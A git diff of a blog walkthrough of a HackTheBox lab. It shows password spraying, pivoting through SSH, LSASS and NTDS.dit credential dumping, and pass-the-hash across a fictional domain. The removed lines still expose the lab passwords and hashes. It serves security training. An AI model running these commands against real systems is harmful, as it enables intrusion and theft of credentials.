@@ -13,7 +13,7 @@ tags:
 I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.
 
 ## 02. Gathering Initial Info
- To start this engagement we know a couple things. We have a user Betty Jade that works at  Nexura LLC. We also have a password for the user `Texas123!@#` with a reasonable assumption that she reuses passwords. We also have the scope of this engagement with the following devices:
+ To start this engagement we know a couple things. We have a user Betty Jade that works at  Nexura LLC. We also have a password for the user `<REDACTED>` with a reasonable assumption that she reuses passwords. We also have the scope of this engagement with the following devices:
 |Host|IP Address|
 |---|---|
 |DMZ01|10.129.39.174, 172.16.119.13|
@@ -53,38 +53,38 @@ From here we can see that SSH is open. Since we have a possible password but no 
 th@ddeu$ git clone https://github.com/urbanadventurer/username-anarchy.git
 th@ddeu$ cd username-anarchy
 th@ddeu$ ./username-anarchy Betty Jade > /tmp/bjade.txt
-th@ddeu$ hydra -L /tmp/bjade.txt -p 'Texas123!@#' ssh://10.129.39.174
+th@ddeu$ hydra -L /tmp/bjade.txt -p '<REDACTED>' ssh://10.129.39.174
 --SNIP--
-[22][ssh] host: 10.129.39.174   login: jbetty   password: Texas123!@#
+[22][ssh] host: 10.129.39.174   login: <REDACTED>   password: <REDACTED>
 --SNIP--
 ```
 Now we that we have a valid username and password we can log into the machine to verify access. 
 ```
-th@ddeu$ ssh jbetty@10.129.39.174
-jbetty@DMZ01:~$ 
+th@ddeu$ ssh <REDACTED>@10.129.39.174
+<REDACTED>@DMZ01:~$ 
 ```
 At this point we can see that we are on an Ubuntu 20.04 server. The user has no sudo privilges and if we do a list of the files available to this user we can see the following standard files
 ```
-jbetty@DMZ01:~$ sudo -l
-[sudo] password for jbetty: 
-Sorry, user jbetty may not run sudo on DMZ01.
+<REDACTED>@DMZ01:~$ sudo -l
+[sudo] password for <REDACTED>: 
+Sorry, user <REDACTED> may not run sudo on DMZ01.
 
-jbetty@DMZ01:~$ ll
+<REDACTED>@DMZ01:~$ ll
 total 32
-drwxr-xr-x 4 jbetty jbetty 4096 Jun  2 08:17 ./
+drwxr-xr-x 4 <REDACTED> <REDACTED> 4096 Jun  2 08:17 ./
 drwxr-xr-x 4 root   root   4096 May 30 11:35 ../
--rw-r--r-- 1 jbetty jbetty 2139 Jun  2 08:19 .bash_history
--rw-r--r-- 1 jbetty jbetty  220 Apr 29 13:20 .bash_logout
--rw-r--r-- 1 jbetty jbetty 3771 Apr 29 13:20 .bashrc
-drwx------ 2 jbetty jbetty 4096 May 30 11:35 .cache/
-drwxrwxr-x 3 jbetty jbetty 4096 May 30 11:35 .local/
--rw-r--r-- 1 jbetty jbetty  807 Apr 29 13:20 .profile
+-rw-r--r-- 1 <REDACTED> <REDACTED> 2139 Jun  2 08:19 .bash_history
+-rw-r--r-- 1 <REDACTED> <REDACTED>  220 Apr 29 13:20 .bash_logout
+-rw-r--r-- 1 <REDACTED> <REDACTED> 3771 Apr 29 13:20 .bashrc
+drwx------ 2 <REDACTED> <REDACTED> 4096 May 30 11:35 .cache/
+drwxrwxr-x 3 <REDACTED> <REDACTED> 4096 May 30 11:35 .local/
+-rw-r--r-- 1 <REDACTED> <REDACTED>  807 Apr 29 13:20 .profile
 ```
 Of these files, the only thing I can really think of to do is checking the bash history for any commands the user has run and maybe the profile files to see any potential startup scripts or environment variables of note
 ```
-jbetty@DMZ01:~$ less -N .bash_history 
+<REDACTED>@DMZ01:~$ less -N .bash_history 
 --SNIP--
-     25 sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
+     25 sshpass -p "<REDACTED>" ssh hwilliam@file01
 --SNIP--
      40 ssh user@192.168.0.101
      41 scp file.txt user@192.168.0.101:~/Documents/
@@ -97,7 +97,7 @@ jbetty@DMZ01:~$ less -N .bash_history
 ## 05. Pivoting out of the DMZ
 The testuser line seemed pretty interesting as we could potentially use that to get root access to this machine, unfortunately that user no longer exists. Next the 192.168.0.101 machine is out of scope. Lastly we can see potential credentials to FILE01, which is in scope. So when I first tried to go about this, i spent too much time trying to escalate privileges on this machine so that i could use [chisel](https://github.com/jpillora/chisel) or to be able to ssh tunnel since that was locked down. Turns out all i needed to do was use the built in SSH SOCKS5 Proxy and proxychains my traffic through to the target machines. 
 ```
-th@ddeu$ ssh -D 9050 jbetty@10.129.39.174
+th@ddeu$ ssh -D 9050 <REDACTED>@10.129.39.174
 th@ddeu$ sudo vim /etc/proxychains.conf
 # ENSURE YOUR CONFIG HAS THE FOLLOWING
 --SNIP--
@@ -127,7 +127,7 @@ th@ddeu$ sudo proxychains nmap -Pn -sT -p 21-23,80,135,443,445,3389,5985,5986,80
 ## 06. Gaining Access to FILE01
 Lets Focus on the ports that we have open on FILE01, we can see that we can access this machine a few different ways, lets try the least intrusive method of checking the shares available first, and maybe connecting through psexec, we can also try to RDP but i typically save that for a last resort.
 ```
-th@ddeu$ sudo proxychains smbclient -U "NEXURA\hwilliam%dealer-screwed-gym1" -L //172.16.119.10
+th@ddeu$ sudo proxychains smbclient -U "NEXURA\hwilliam%<REDACTED>" -L //172.16.119.10
 --SNIP--
         Sharename       Type      Comment
         ---------       ----      -------
@@ -141,7 +141,7 @@ th@ddeu$ sudo proxychains smbclient -U "NEXURA\hwilliam%dealer-screwed-gym1" -L 
         TRANSFER        Disk    
 --SNIP--
 
-th@ddeu$ sudo proxychains impacket-psexec NEXURA/hwilliam:dealer-screwed-gym1@172.16.119.10
+th@ddeu$ sudo proxychains impacket-psexec NEXURA/hwilliam:<REDACTED>@172.16.119.10
 --SNIP--
 [*] Requesting shares on 172.16.119.10.....
 [-] share 'ADMIN$' is not writable.
@@ -154,7 +154,7 @@ th@ddeu$ sudo proxychains impacket-psexec NEXURA/hwilliam:dealer-screwed-gym1@17
 --SNIP--
 
 
-th@ddeu$ proxychains xfreerdp /v:172.16.119.10 /d:nexura.htb /u:hwilliam /p:'dealer-screwed-gym1' /cert:ignore /dynamic-resolution /drive:linux,/home/th/filetransfer
+th@ddeu$ proxychains xfreerdp /v:172.16.119.10 /d:nexura.htb /u:hwilliam /p:'<REDACTED>' /cert:ignore /dynamic-resolution /drive:linux,/home/th/filetransfer
 --SNIP--
 [14:04:26:177] [315880:315882] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 0: Success
 [14:04:26:177] [315880:315882] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
@@ -166,7 +166,7 @@ th@ddeu$ proxychains xfreerdp /v:172.16.119.10 /d:nexura.htb /u:hwilliam /p:'dea
 ```
 As we can see our remote access attempts did not work, so were just gonna take a look around the shares to see if theres anything of interest there. In the interest of time. This is an unprivileged user so i couldnt access the C$ or ADMIN$ shares so in the interest of brevity im gonna skip to the one that actually worked. 
 ```
-th@ddeu$ sudo proxychains smbclient -U "NEXURA\hwilliam%dealer-screwed-gym1" //172.16.119.10/HR
+th@ddeu$ sudo proxychains smbclient -U "NEXURA\hwilliam%<REDACTED>" //172.16.119.10/HR
 smb: \> dir                                                                                    
   .                                   D        0  Wed Jul 16 13:58:02 2025
   ..                                  D        0  Wed Jul 16 13:58:02 2025
@@ -189,7 +189,7 @@ From here, doing some research into the psafe3 filestype uncovers a 2john tool t
 th@ddeu$ pwsafe2john ./Employee-Passwords_OLD.psafe3 > /tmp/employee_psafe.txt
 th@ddeu$ john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/employee_psafe.txt
 --SNIP--
-michaeljackson   (Employee-Passwords_OLD)   
+<REDACTED>   (Employee-Passwords_OLD)   
 --SNIP--
 th@ddeu$ sudo apt install passwordsafe
 th@ddeu$ 
@@ -199,17 +199,16 @@ From here we have to download the app and open the gui to copy and paste out the
 ![Unlocked](./20250716_passwordsafe_unlocked.PNG)  \
 The resulting creds are as follows
 ```
-#DMZ01
-## jbetty / xiao-nicer-wheels5
+
 #Domain Users
-## bdavid / caramel-cigars-reply1
-## stom / fails-nibble-disturb4
-## hwilliam / warned-wobble-occur8
+## bdavid / <REDACTED>
+## stom / <REDACTED>
+## hwilliam / <REDACTED>
 ```
 ## 07. Gaining Access to JUMP01
 Taking a look ath these creds, the only ones that are still valid are bdavid's unfortunately his credentials dont give us access to any files of interest
 ```
-th@ddeu$ sudo proxychains smbclient -U "NEXURA\bdavid%caramel-cigars-reply1" -L //172.16.119.10
+th@ddeu$ sudo proxychains smbclient -U "NEXURA\bdavid%<REDACTED>" -L //172.16.119.10
 --SNIP--
 
         Sharename       Type      Comment
@@ -226,7 +225,7 @@ th@ddeu$ sudo proxychains smbclient -U "NEXURA\bdavid%caramel-cigars-reply1" -L 
 ```
 From here we can use our newly found credentials to attempt remote access to the other machines. For brevity's sake im going to omit the numerous failed attempts, but i tried psexec and xfreerdp on both other machines with both sets of credentials, and was able to get on to the JUMP01 server with bdavid via rdp.
 ```
-th@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:bdavid /p:'caramel-cigars-reply1' /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
+th@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:bdavid /p:'<REDACTED>' /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
 ```
 A quick check shows us that bdavid is allowed to launch an administrative shell which makes our lives a lot easier. At this point we can upload mimikatz if we would like, but i wanted to try the method of dumping LSASS since for some reason it wouldnt work for me in the earlier labs using the GUI method in Task Manager
 ![Lsass Dump](./20250726_lsass.PNG)
@@ -238,7 +237,7 @@ th@ddeu$ pypykatz lsa minidump lsass.DMP | less -N
      77                 Username: JUMP01$
      78                 Domain: NEXURA
      79                 LM: NA
-     80                 NT: fa04a67f5a8620d4ce87238f139a992b
+     80                 NT: <REDACTED>
      81                 SHA1: 8d45e4af84cfe51b8a6f8f483e955f0b0f281abc
      82                 DPAPI: 0000000000000000000000000000000000000000
 --SNIP--
@@ -246,7 +245,7 @@ th@ddeu$ pypykatz lsa minidump lsass.DMP | less -N
     294                 Username: stom
     295                 Domain: NEXURA
     296                 LM: NA
-    297                 NT: 21ea958524cfd9a7791737f8d2f764fa
+    297                 NT: <REDACTED>
     298                 SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
     299                 DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
 --SNIP--
@@ -254,14 +253,14 @@ th@ddeu$ pypykatz lsa minidump lsass.DMP | less -N
 At this point we only have the hash and if we cant PTH with RDP unless we enable restricted admin mode, so we will have to try other methods of gaining access to the domain controller. At this point i was going to try psexec or evil-winrm and psexec is a lot easier so i went with that then i enabled restricted admin mode and conected to the machine via RDP.
 ## 08. Gaining Access to DC01
 ```
-th@ddeu$ sudo proxychains impacket-psexec NEXURA/stom@172.16.119.10 -hashes :21ea958524cfd9a7791737f8d2f764fa
+th@ddeu$ sudo proxychains impacket-psexec NEXURA/stom@172.16.119.10 -hashes :<REDACTED>
 --SNIP--
 Microsoft Windows [Version 10.0.17763.2628]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 
-th@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:stom /pth:'21ea958524cfd9a7791737f8d2f764fa' /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
+th@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:stom /pth:'<REDACTED>' /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
 ```
 This did not work so im going to back out and use evil-winrm to connect to the machine
 ```
@@ -281,7 +280,7 @@ th@ddeu$ sudo vim /etc/hosts
 #MAKE SURE YOUR FILE HAS THE FOLLOWING
 172.16.119.11 DC01 dc01 DC01.NEXURA.HTB dc01.nexura.htb NEXURA.HTB nexura.htb
 --SNIP--
-th@ddeu$ proxychains evil-winrm -i DC01 -u stom -H 21ea958524cfd9a7791737f8d2f764fa 
+th@ddeu$ proxychains evil-winrm -i DC01 -u stom -H <REDACTED> 
 *Evil-WinRM* PS C:\Users\stom\Documents> 
 ```
 Now that we have access to the system we can try to grab the SYSTEM and ntds.dit files to dump them and get the administrator hash that we need to pass this lab.We can do this most easily by just creating a volume shadow copy and copying the files to our local system
@@ -309,14 +308,6 @@ Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its af
 [*] Searching for pekList, be patient
 [*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69
 [*] Reading and decrypting hashes from ./NTDS.dit
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:9d80cee28b2e985285a43a7c4eb3122c:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11dee8f685882eb4f78a450291569bd0:::
-nexura.htb\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:82c5ef7f2612567964070d04fe46a5d0:::
-nexura.htb\stom:1106:aad3b435b51404eeaad3b435b51404ee:21ea958524cfd9a7791737f8d2f764fa::: 
-nexura.htb\hwilliam:1107:aad3b435b51404eeaad3b435b51404ee:f3ac86b290a51fb59a1a66f50b658e1f:::
-FILE01$:1108:aad3b435b51404eeaad3b435b51404ee:b7374a9de2bf6951a5c66a7675df7f2f:::
-JUMP01$:1109:aad3b435b51404eeaad3b435b51404ee:7bef0ee0b472d2c5805921324525f321:::
+--SNIP--
 
 ```
